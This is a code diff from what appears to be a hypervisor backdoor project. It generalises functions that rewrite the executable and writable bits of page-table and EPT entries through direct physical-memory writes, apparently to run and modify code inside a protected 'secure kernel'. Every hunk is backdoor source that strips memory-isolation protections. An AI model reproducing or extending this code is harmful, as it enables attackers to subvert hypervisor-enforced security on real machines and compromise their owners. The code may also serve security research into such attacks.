@@ -15,11 +15,21 @@
 // secure kernel maximum image size
 #define SK_MAX_IMAGE_SIZE (10 * 1024 * 1024) // 10M
 
-// remove XD bit from PML4/PDPT/PD/PT entry
-#define EXECUTABLE_PT(_e_) ((_e_) & ~((uint64_t)1 << 63))
+// remove/set XD bit from PML4/PDPT/PD/PT entry
+#define PT_EXECUTABLE_SET(_e_) ((_e_) & ~((uint64_t)1 << 63))
+#define PT_EXECUTABLE_UNSET(_e_) ((_e_) | ((uint64_t)1 << 63))
 
-// set Execute Access bit on EPT PML4/PDPT/PD/PT entry
-#define EXECUTABLE_PTE(_e_) ((_e_) | ((uint64_t)1 << 2))
+// set/remove R/W bit on PML4/PDPT/PD/PT entry
+#define PT_WRITEABLE_SET(_e_) ((_e_) | ((uint64_t)1 << 1))
+#define PT_WRITEABLE_UNSET(_e_) ((_e_) & ~((uint64_t)1 << 1))
+
+// set/remove Execute Access bit on EPT PML4/PDPT/PD/PT entry
+#define EPT_EXECUTABLE_SET(_e_) ((_e_) | ((uint64_t)1 << 2))
+#define EPT_EXECUTABLE_UNSET(_e_) ((_e_) & ~((uint64_t)1 << 2))
+
+// set/remove Write Access bit on EPT PML4/PDPT/PD/PT entry
+#define EPT_WRITEABLE_SET(_e_) ((_e_) | ((uint64_t)1 << 1))
+#define EPT_WRITEABLE_UNSET(_e_) ((_e_) & ~((uint64_t)1 << 1))
 
 bool m_quiet = false;
 //--------------------------------------------------------------------------------------
@@ -1672,7 +1682,7 @@ _end:
     return ret;
 }
 //--------------------------------------------------------------------------------------
-int backdoor_make_exec_ept(uint64_t addr, uint64_t pml4_addr)
+int backdoor_modify_ept(uint32_t flags, uint64_t addr, uint64_t pml4_addr)
 {
     uint64_t phys_addr = 0;
 
@@ -1691,8 +1701,21 @@ int backdoor_make_exec_ept(uint64_t addr, uint64_t pml4_addr)
         return -1;
     }
 
-    // make EPT PML4 entry executable
-    if (backdoor_phys_write_64(phys_addr, EXECUTABLE_PTE(PML4_entry.Uint64)) != 0)
+    PML4_entry.Uint64 = EPT_EXECUTABLE_UNSET(PML4_entry.Uint64);
+    PML4_entry.Uint64 = EPT_WRITEABLE_UNSET(PML4_entry.Uint64);
+
+    if (flags & HVBD_MEM_EXECUTABLE)
+    {
+        PML4_entry.Uint64 = EPT_EXECUTABLE_SET(PML4_entry.Uint64);
+    }
+
+    if (flags & HVBD_MEM_WRITEABLE)
+    {
+        PML4_entry.Uint64 = EPT_WRITEABLE_SET(PML4_entry.Uint64);
+    }
+
+    // modify EPT PML4 entry
+    if (backdoor_phys_write_64(phys_addr, PML4_entry.Uint64) != 0)
     {
         return -1;
     }
@@ -1712,8 +1735,21 @@ int backdoor_make_exec_ept(uint64_t addr, uint64_t pml4_addr)
         return -1;
     }
 
-    // make EPT PDPT entry executable
-    if (backdoor_phys_write_64(phys_addr, EXECUTABLE_PTE(PDPT_entry.Uint64)) != 0)
+    PDPT_entry.Uint64 = EPT_EXECUTABLE_UNSET(PDPT_entry.Uint64);
+    PDPT_entry.Uint64 = EPT_WRITEABLE_UNSET(PDPT_entry.Uint64);
+
+    if (flags & HVBD_MEM_EXECUTABLE)
+    {
+        PDPT_entry.Uint64 = EPT_EXECUTABLE_SET(PDPT_entry.Uint64);
+    }
+
+    if (flags & HVBD_MEM_WRITEABLE)
+    {
+        PDPT_entry.Uint64 = EPT_WRITEABLE_SET(PDPT_entry.Uint64);
+    }
+
+    // modify EPT PDPT entry
+    if (backdoor_phys_write_64(phys_addr, PDPT_entry.Uint64) != 0)
     {
         return -1;
     }
@@ -1736,8 +1772,21 @@ int backdoor_make_exec_ept(uint64_t addr, uint64_t pml4_addr)
             return -1;
         }
 
-        // make EPT PD entry executable
-        if (backdoor_phys_write_64(phys_addr, EXECUTABLE_PTE(PD_entry.Uint64)) != 0)
+        PD_entry.Uint64 = EPT_EXECUTABLE_UNSET(PD_entry.Uint64);
+        PD_entry.Uint64 = EPT_WRITEABLE_UNSET(PD_entry.Uint64);
+
+        if (flags & HVBD_MEM_EXECUTABLE)
+        {
+            PD_entry.Uint64 = EPT_EXECUTABLE_SET(PD_entry.Uint64);
+        }
+
+        if (flags & HVBD_MEM_WRITEABLE)
+        {
+            PD_entry.Uint64 = EPT_WRITEABLE_SET(PD_entry.Uint64);
+        }
+
+        // modify EPT PD entry
+        if (backdoor_phys_write_64(phys_addr, PD_entry.Uint64) != 0)
         {
             return -1;
         }
@@ -1756,8 +1805,21 @@ int backdoor_make_exec_ept(uint64_t addr, uint64_t pml4_addr)
 
             if (EPT_PRESENT(PT_entry.Uint64))
             {
-                // make EPT PT entry executable
-                if (backdoor_phys_write_64(phys_addr, EXECUTABLE_PTE(PT_entry.Uint64)) != 0)
+                PT_entry.Uint64 = EPT_EXECUTABLE_UNSET(PT_entry.Uint64);
+                PT_entry.Uint64 = EPT_WRITEABLE_UNSET(PT_entry.Uint64);
+
+                if (flags & HVBD_MEM_EXECUTABLE)
+                {
+                    PT_entry.Uint64 = EPT_EXECUTABLE_SET(PT_entry.Uint64);
+                }
+
+                if (flags & HVBD_MEM_WRITEABLE)
+                {
+                    PT_entry.Uint64 = EPT_WRITEABLE_SET(PT_entry.Uint64);
+                }
+
+                // modify EPT PT entry
+                if (backdoor_phys_write_64(phys_addr, PT_entry.Uint64) != 0)
                 {
                     return -1;
                 }
@@ -1784,7 +1846,7 @@ int backdoor_make_exec_ept(uint64_t addr, uint64_t pml4_addr)
     return -1;
 }
 //--------------------------------------------------------------------------------------
-int backdoor_make_exec_pt(uint64_t addr, uint64_t pml4_addr, uint64_t ept_addr)
+int backdoor_modify_pt(uint32_t flags, uint64_t addr, uint64_t pml4_addr, uint64_t ept_addr)
 {
     uint64_t phys_addr = 0;
     
@@ -1811,8 +1873,21 @@ int backdoor_make_exec_pt(uint64_t addr, uint64_t pml4_addr, uint64_t ept_addr)
         return -1;
     }
 
-    // make PML4 entry executable
-    if (backdoor_phys_write_64(phys_addr, EXECUTABLE_PT(PML4_entry.Uint64)) != 0)
+    PML4_entry.Uint64 = PT_EXECUTABLE_UNSET(PML4_entry.Uint64);
+    PML4_entry.Uint64 = PT_WRITEABLE_UNSET(PML4_entry.Uint64);
+
+    if (flags & HVBD_MEM_EXECUTABLE)
+    {
+        PML4_entry.Uint64 = PT_EXECUTABLE_SET(PML4_entry.Uint64);
+    }
+
+    if (flags & HVBD_MEM_WRITEABLE)
+    {
+        PML4_entry.Uint64 = PT_WRITEABLE_SET(PML4_entry.Uint64);
+    }
+
+    // modify PML4 entry
+    if (backdoor_phys_write_64(phys_addr, PML4_entry.Uint64) != 0)
     {
         return -1;
     }
@@ -1840,8 +1915,21 @@ int backdoor_make_exec_pt(uint64_t addr, uint64_t pml4_addr, uint64_t ept_addr)
         return -1;
     }
 
-    // make PDPT entry executable
-    if (backdoor_phys_write_64(phys_addr, EXECUTABLE_PT(PDPT_entry.Uint64)) != 0)
+    PDPT_entry.Uint64 = PT_EXECUTABLE_UNSET(PDPT_entry.Uint64);
+    PDPT_entry.Uint64 = PT_WRITEABLE_UNSET(PDPT_entry.Uint64);
+
+    if (flags & HVBD_MEM_EXECUTABLE)
+    {
+        PDPT_entry.Uint64 = PT_EXECUTABLE_SET(PDPT_entry.Uint64);
+    }
+
+    if (flags & HVBD_MEM_WRITEABLE)
+    {
+        PDPT_entry.Uint64 = PT_WRITEABLE_SET(PDPT_entry.Uint64);
+    }
+
+    // modify PDPT entry executable
+    if (backdoor_phys_write_64(phys_addr, PDPT_entry.Uint64) != 0)
     {
         return -1;
     }
@@ -1872,8 +1960,21 @@ int backdoor_make_exec_pt(uint64_t addr, uint64_t pml4_addr, uint64_t ept_addr)
             return -1;
         }
 
-        // make PD entry executable
-        if (backdoor_phys_write_64(phys_addr, EXECUTABLE_PT(PD_entry.Uint64)) != 0)
+        PD_entry.Uint64 = PT_EXECUTABLE_UNSET(PD_entry.Uint64);
+        PD_entry.Uint64 = PT_WRITEABLE_UNSET(PD_entry.Uint64);
+
+        if (flags & HVBD_MEM_EXECUTABLE)
+        {
+            PD_entry.Uint64 = PT_EXECUTABLE_SET(PD_entry.Uint64);
+        }
+
+        if (flags & HVBD_MEM_WRITEABLE)
+        {
+            PD_entry.Uint64 = PT_WRITEABLE_SET(PD_entry.Uint64);
+        }
+
+        // modify PD entry
+        if (backdoor_phys_write_64(phys_addr, PD_entry.Uint64) != 0)
         {
             return -1;
         }
@@ -1900,8 +2001,21 @@ int backdoor_make_exec_pt(uint64_t addr, uint64_t pml4_addr, uint64_t ept_addr)
 
             if (PT_entry.Bits.Present)
             {
-                // make PT entry executable
-                if (backdoor_phys_write_64(phys_addr, EXECUTABLE_PT(PT_entry.Uint64)) != 0)
+                PT_entry.Uint64 = PT_EXECUTABLE_UNSET(PT_entry.Uint64);
+                PT_entry.Uint64 = PT_WRITEABLE_UNSET(PT_entry.Uint64);
+
+                if (flags & HVBD_MEM_EXECUTABLE)
+                {
+                    PT_entry.Uint64 = PT_EXECUTABLE_SET(PT_entry.Uint64);
+                }
+
+                if (flags & HVBD_MEM_WRITEABLE)
+                {
+                    PT_entry.Uint64 = PT_WRITEABLE_SET(PT_entry.Uint64);
+                }
+
+                // modify PT entry
+                if (backdoor_phys_write_64(phys_addr, PT_entry.Uint64) != 0)
                 {
                     return -1;
                 }
@@ -1913,7 +2027,7 @@ int backdoor_make_exec_pt(uint64_t addr, uint64_t pml4_addr, uint64_t ept_addr)
                 if (ept_addr != 0)
                 {
                     // make EPT entries executable too
-                    if (backdoor_make_exec_ept(phys_addr, ept_addr) != 0)
+                    if (backdoor_modify_ept(flags, phys_addr, ept_addr) != 0)
                     {
                         return -1;
                     }
@@ -1937,7 +2051,7 @@ int backdoor_make_exec_pt(uint64_t addr, uint64_t pml4_addr, uint64_t ept_addr)
                 for (uint64_t i = 0; i < 0x200; i += 1)
                 {
                     // make EPT entries executable too
-                    if (backdoor_make_exec_ept(phys_addr + (i * PAGE_SIZE), ept_addr) != 0)
+                    if (backdoor_modify_ept(flags, phys_addr + (i * PAGE_SIZE), ept_addr) != 0)
                     {
                         return -1;
                     }
@@ -1958,7 +2072,7 @@ int backdoor_make_exec_pt(uint64_t addr, uint64_t pml4_addr, uint64_t ept_addr)
             for (uint64_t i = 0; i < 0x40000; i += 1)
             {
                 // make EPT entries executable too
-                if (backdoor_make_exec_ept(phys_addr + (i * PAGE_SIZE), ept_addr) != 0)
+                if (backdoor_modify_ept(flags, phys_addr + (i * PAGE_SIZE), ept_addr) != 0)
                 {
                     return -1;
                 }
